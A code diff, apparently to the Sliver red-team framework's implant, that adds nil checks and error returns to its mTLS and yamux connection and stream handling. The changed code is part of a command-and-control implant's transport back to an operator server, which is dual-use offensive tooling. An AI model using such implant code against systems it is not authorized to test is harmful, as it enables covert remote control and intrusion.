@@ -25,7 +25,9 @@ import (
 	// {{end}}
 
 	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
+	"errors"
 	"strconv"
+
 	// {{end}}
 
 	// {{if .Config.Debug}}
@@ -45,8 +47,6 @@ import (
 	// {{end}}
 
 	// {{if .Config.IncludeWG}}
-	"errors"
-
 	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
 	"golang.zx2c4.com/wireguard/device"
 
@@ -257,6 +257,13 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 		if err != nil {
 			return err
 		}
+		if conn == nil {
+			errMsg := ""
+			// {{if .Config.Debug}}
+			errMsg = "mtls connection returned nil conn"
+			// {{end}}
+			return errors.New(errMsg)
+		}
 		if _, err := conn.Write([]byte(mtls.YamuxPreface)); err != nil {
 			conn.Close()
 			return err
@@ -265,6 +272,14 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 		if err != nil {
 			conn.Close()
 			return err
+		}
+		if muxSession == nil {
+			conn.Close()
+			errMsg := ""
+			// {{if .Config.Debug}}
+			errMsg = "[mtls] failed to create yamux session (nil)"
+			// {{end}}
+			return errors.New(errMsg)
 		}
 		connection.IsOpen = true
 
@@ -292,6 +307,10 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 						connection.Cleanup()
 						return
 					}
+					if isNilInterface(stream) {
+						connection.Cleanup()
+						return
+					}
 					defer stream.Close()
 					if err := mtls.WriteEnvelope(stream, envelope); err != nil {
 						connection.Cleanup()
@@ -312,6 +331,10 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 					}()
 					stream, err := muxSession.Open()
 					if err != nil {
+						connection.Cleanup()
+						return
+					}
+					if isNilInterface(stream) {
 						connection.Cleanup()
 						return
 					}
@@ -344,6 +367,9 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 			for {
 				stream, err := muxSession.Accept()
 				if err != nil {
+					return
+				}
+				if isNilInterface(stream) {
 					return
 				}
 
